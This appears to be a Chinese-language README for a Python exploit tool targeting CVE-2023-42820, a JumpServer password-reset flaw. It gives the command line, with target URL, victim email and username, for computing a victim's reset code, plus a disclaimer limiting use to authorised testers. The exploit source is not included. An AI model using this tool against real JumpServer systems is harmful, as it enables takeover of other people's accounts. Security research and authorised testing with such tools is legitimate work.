# CVE-2023-42820

CVE-2023-42820

## 漏洞说明

JumpServer 密码重置漏洞

## USAGE

计算验证码需要指定对应邮箱的用户名，运行后会自动判断是否存在漏洞，并尝试计算验证码

~~~python
python CVE-2023-42820.py -t http://IP:Port -e email -u username

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗  █████╗ ██████╗  ██████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██╔══██╗╚════██╗██╔═████╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝╚█████╔╝ █████╔╝██║██╔██║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ██╔══██╗██╔═══╝ ████╔╝██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗╚█████╔╝███████╗╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝ ╚════╝ ╚══════╝ ╚═════╝
                                                                            @Auth: C1ph3rX13
                                                                            @Blog: https://c1ph3rx13.github.io
                                                                            @Note: 代码仅供学习使用，请勿用于其他用途


usage: CVE-2023-42820.py [-h] -t TARGET -e EMAIL -u USERNAME [--proxy PROXY]

CVE-2023-42820 by C1ph3rX13.

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target url
  -e EMAIL, --email EMAIL
                        account email
  -u USERNAME, --username USERNAME
                        account username
  --proxy PROXY         proxy to http://ip:port
~~~

![image-1](https://raw.githubusercontent.com/C1ph3rX13/CVE-2023-42820/main/image/1.png)

![image-2](https://raw.githubusercontent.com/C1ph3rX13/CVE-2023-42820/main/image/2.png)

## 免责声明

1. 本工具仅面向拥有合法授权的渗透测试安全人员及进行常规操作的网络运维人员，用户可在取得足够合法授权且非商用的前提下进行下载、复制、传播或使用。
2. 在使用本工具的过程中，您应确保自己的所有行为符合当地法律法规，且不得将此软件用于违反中国人民共和国相关法律的活动。本工具所有作者和贡献者不承担用户擅自使用本工具从事任何违法活动所产生的任何责任。

### 参考

https://github.com/vulhub/vulhub/tree/master/base/jumpserver/3.6.3
